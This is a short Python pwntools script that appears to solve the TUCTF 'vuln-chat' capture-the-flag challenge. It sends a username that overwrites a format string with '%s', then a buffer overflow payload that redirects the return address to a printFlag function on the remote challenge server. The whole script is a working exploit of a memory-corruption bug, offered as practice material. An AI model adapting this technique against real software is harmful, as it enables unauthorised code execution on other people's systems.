#!/usr/bin/env python2

from pwn import *

# p = process("./vuln-chat")
p = remote("vulnchat.tuctf.com", 4141)
pause()

payload = "A" * 20
payload += "%s"
p.sendlineafter("Enter your username:", payload)

payload = "A" * 0x2d
payload += "RRRR"
payload += p32(0x0804856B) # printFlag
p.sendlineafter(":", payload)

p.interactive()
